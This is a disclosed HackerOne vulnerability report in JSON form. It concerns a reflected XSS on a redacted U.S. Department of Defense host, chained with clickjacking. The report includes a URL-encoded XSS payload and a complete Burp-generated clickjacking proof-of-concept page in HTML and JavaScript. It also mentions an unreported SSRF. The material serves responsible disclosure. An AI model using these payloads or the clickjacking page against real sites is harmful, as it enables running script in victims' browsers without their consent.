{
  "id": 1149144,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTQ5MTQ0",
  "url": "https://hackerone.com/reports/1149144",
  "title": "Reflected XSS through clickjacking at https://████",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-04-05T13:15:55.478Z",
  "submitted_at": "2021-04-05T13:15:57.347Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "nagli",
    "url": "/nagli",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/8qutl64oet0kknvvritymh3e2k1p/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-06-03T16:23:53.324Z",
  "bug_reporter_agreed_on_going_public_at": "2021-06-01T13:52:44.644Z",
  "team_member_agreed_on_going_public_at": "2021-06-03T16:23:53.167Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Description:**\nI'm able to control the url being inserted into the query line at\n\n```\nhttps://█████/████&url=http%3a%2f%2fgalnagli.com%2f%3Cimg+src%3dx+onerror%3dalert%28document.domain%29%3E\n```\n\nThe server issues a request (there is also SSRF here I'll report later) to the domain specified, and it renders the path being entered, so when supplying as a path:\n\n```\n<img src=x onerror=alert(1)>\n```\n\nit will pop alert execution\n\nas the request is being done with XMLHTTPRequest I couldn't make it CSRF, so I chained it with clickjacking.\n\n███\n\n## Best Regards\nnagli\n\n## Impact\n\nExecuting javascript on the victims behalf.\n\n## System Host(s)\n███████\n\n## Affected Product(s) and Version(s)\n██████████\n\n## CVE Numbers\n\n\n## Steps to Reproduce\nHost the following HTML page, and make a click.\n\n```\n\n<div id=\"container\" style=\"clip-path:none;clip:auto;overflow:visible;position:absolute;left:0;top:0;width:100%;height:100%\">\n<!-- Clickjacking PoC Generated by Burp Suite Professional -->\n<input id=\"clickjack_focus\" style=\"opacity:0;position:absolute;left:-5000px;\">\n<div id=\"clickjack_button\" style=\"opacity: 1; transform-style: preserve-3d; text-align: center; font-family: Arial; font-size: 100%; width: 64px; height: 21px; z-index: 0; background-color: red; color: rgb(255, 255, 255); position: absolute; left: 200px; top: 200px;\"><div style=\"position:relative;top: 50%;transform: translateY(-50%);\">Click</div></div>\n<!-- Show this element when clickjacking is complete -->\n<div id=\"clickjack_complete\" style=\"display: none; transform-style: preserve-3d; font-family: Arial; font-size: 16pt; color: red; text-align: center; width: 100%; height: 100%;\"><div style=\"position:relative;top: 50%;transform: translateY(-50%);\">You've been clickjacked!</div></div>\n<iframe id=\"parentFrame\" src=\"data:text/html;base64,████████\" frameborder=\"0\" scrolling=\"no\" style=\"-ms-transform: scale(1.0);-ms-transform-origin: 200px 200px;transform: scale(1.0);-moz-transform: scale(1.0);-moz-transform-origin: 200px 200px;-o-transform: scale(1.0);-o-transform-origin: 200px 200px;-webkit-transform: scale(1.0);-webkit-transform-origin: 200px 200px;opacity:0.5;border:0;position:absolute;z-index:1;width:1905px;height:984px;left:0px;top:0px\"></iframe>\n</div>\n<script>function findPos(obj) {\n\t    var left = 0, top = 0;\n\t    if(obj.offsetParent) {\n\t        while(1) {\n\t          left += obj.offsetLeft;\n\t          top += obj.offsetTop;\n\t          if(!obj.offsetParent) {\n\t            break;\n\t          }\n\t          obj = obj.offsetParent;\n\t        }\n\t    } else if(obj.x && obj.y) {\n\t        left += obj.x;\n\t        top += obj.y;\n\t    }\n\t    return [left,top];\n  \t}function generateClickArea(pos) {\n\t\t\tvar elementWidth, elementHeight, x, y, parentFrame = document.getElementById('parentFrame'), desiredX = 200, desiredY = 200, parentOffsetWidth, parentOffsetHeight, docWidth, docHeight,\n\t\t\t\tbtn = document.getElementById('clickjack_button');\n\t\t\tif(pos < window.clickbandit.config.clickTracking.length) {\n\t\t\t\tclickjackCompleted(false);\n\t\t\t\telementWidth = window.clickbandit.config.clickTracking[pos].width;\n\t\t\t\telementHeight = window.clickbandit.config.clickTracking[pos].height;\n\t\t\t\tbtn.style.width = elementWidth + 'px';\n\t\t\t\tbtn.style.height = elementHeight + 'px';\n\t\t\t\twindow.clickbandit.elementWidth = elementWidth;\n\t\t\t\twindow.clickbandit.elementHeight = elementHeight;\n\t\t\t\tx = window.clickbandit.config.clickTracking[pos].left;\n\t\t\t\ty = window.clickbandit.config.clickTracking[pos].top;\n\t\t\t\tdocWidth = window.clickbandit.config.clickTracking[pos].documentWidth;\n\t\t\t\tdocHeight = window.clickbandit.config.clickTracking[pos].documentHeight;\n\t\t\t\tparentOffsetWidth = desiredX - x;\n\t\t\t\tparentOffsetHeight = desiredY - y;\n\t\t\t\tparentFrame.style.width = docWidth+'px';\n\t\t\t\tparentFrame.style.height = docHeight+'px';\n\t\t\t\tparentFrame.contentWindow.postMessage(JSON.stringify({clickbandit: 1, docWidth: docWidth, docHeight: docHeight, left: parentOffsetWidth, top: parentOffsetHeight}),'*');\n\t\t\t\tcalculateButtonSize(getFactor(parentFrame));\n\t\t\t\tshowButton();\n\t\t\t\tif(parentFrame.style.opacity === '0') {\n\t\t\t\t\tcalculateClip();\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tresetClip();\n\t\t\t\thideButton();\n\t\t\t\tclickjackCompleted(true);\n\t\t\t}\n\t\t}function hideButton() {\n\t\t\tvar btn = document.getElementById('clickjack_button');\n\t\t\tbtn.style.opacity = 0;\n\t\t}function showButton() {\n\t\t\tvar btn = document.getElementById('clickjack_button');\n\t\t\tbtn.style.opacity = 1;\n\t\t}function clickjackCompleted(show) {\n\t\t\tvar complete = document.getElementById('clickjack_complete');\n\t\t\tif(show) {\n\t\t\t\tcomplete.style.display = 'block';\n\t\t\t} else {\n\t\t\t\tcomplete.style.display = 'none';\n\t\t\t}\n\t\t}window.addEventListener(\"message\", function handleMessages(e){\n\t\t\tvar data;\n\t\t\ttry {\n\t\t\t\tdata = JSON.parse(e.data);\n\t\t\t} catch(e){\n\t\t\t\tdata = {};\n\t\t\t}\n\t\t\tif(!data.clickbandit) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tshowButton();\n\t\t},false);window.addEventListener(\"blur\", function(){ if(window.clickbandit.mouseover) { hideButton();setTimeout(function(){ generateClickArea(++window.clickbandit.config.currentPosition);document.getElementById(\"clickjack_focus\").focus();},1000); } }, false);document.getElementById(\"parentFrame\").addEventListener(\"mouseover\",function(){ window.clickbandit.mouseover = true; }, false);document.getElementById(\"parentFrame\").addEventListener(\"mouseout\",function(){ window.clickbandit.mouseover = false; }, false);</script><script>window.clickbandit={mode: \"review\", mouseover:false,elementWidth:64,elementHeight:21,config:{\"clickTracking\":[{\"width\":64,\"height\":21,\"mouseX\":955,\"mouseY\":258,\"left\":921,\"top\":246,\"documentWidth\":1905,\"documentHeight\":984}],\"currentPosition\":0}};function calculateClip() {\n\t\t\tvar btn = document.getElementById('clickjack_button'), w = btn.offsetWidth, h = btn.offsetHeight, container = document.getElementById('container'), x = btn.offsetLeft, y = btn.offsetTop;\n\t\t\tcontainer.style.overflow = 'hidden';\n\t\t\tcontainer.style.clip = 'rect('+y+'px, '+(x+w)+'px, '+(y+h)+'px, '+x+'px)';\n\t\t\tcontainer.style.clipPath = 'inset('+y+'px '+(x+w)+'px '+(y+h)+'px '+x+'px)';\n\t\t}function calculateButtonSize(factor) {\n\t\t\tvar btn = document.getElementById('clickjack_button'), resizedWidth = Math.round(window.clickbandit.elementWidth * factor), resizedHeight = Math.round(window.clickbandit.elementHeight * factor);\n\t\t\tbtn.style.width = resizedWidth + 'px';\n\t\t\tbtn.style.height = resizedHeight + 'px';\n\t\t\tif(factor > 100) {\n\t\t\t\tbtn.style.fontSize = '400%';\n\t\t\t} else {\n\t\t\t\tbtn.style.fontSize = (factor * 100) + '%';\n\t\t\t}\n\t\t}function resetClip() {\n\t\t\tvar container = document.getElementById('container');\n\t\t\tcontainer.style.overflow = 'visible';\n\t\t\tcontainer.style.clip = 'auto';\n\t\t\tcontainer.style.clipPath = 'none';\n\t\t}function getFactor(obj) {\n\t\t\tif(typeof obj.style.transform === 'string') {\n\t\t\t\treturn obj.style.transform.replace(/[^\\d.]/g,'');\n\t\t\t}\n\t\t\tif(typeof obj.style.msTransform === 'string') {\n\t\t\t\treturn obj.style.msTransform.replace(/[^\\d.]/g,'');\n\t\t\t}\n\t\t\tif(typeof obj.style.MozTransform === 'string') {\n\t\t\t\treturn obj.style.MozTransform.replace(/[^\\d.]/g,'');\n\t\t\t}\n\t\t\tif(typeof obj.style.oTransform === 'string') {\n\t\t\t\treturn obj.style.oTransform.replace(/[^\\d.]/g,'');\n\t\t\t}\n\t\t\tif(typeof obj.style.webkitTransform === 'string') {\n\t\t\t\treturn obj.style.webkitTransform.replace(/[^\\d.]/g,'');\n\t\t\t}\n\t\t\treturn 1;\n\t\t}</script>\n```\n\n## Suggested Mitigation/Remediation Actions\nSanitize the input being presented from the software.\n\nIt might be open one so ill ask for your help to issue CVE if thats the case :-)\n\n",
  "weakness": {
    "id": 61,
    "name": "Cross-site Scripting (XSS) - Reflected"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 10,
  "voters": [
    "drsniper",
    "nagli",
    "yusuf_furkan",
    "meispi",
    "ekgaribadmi",
    "loneliestwolf",
    "stamarion",
    "pratapshrestha",
    "oruvio",
    "iamn00b007"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
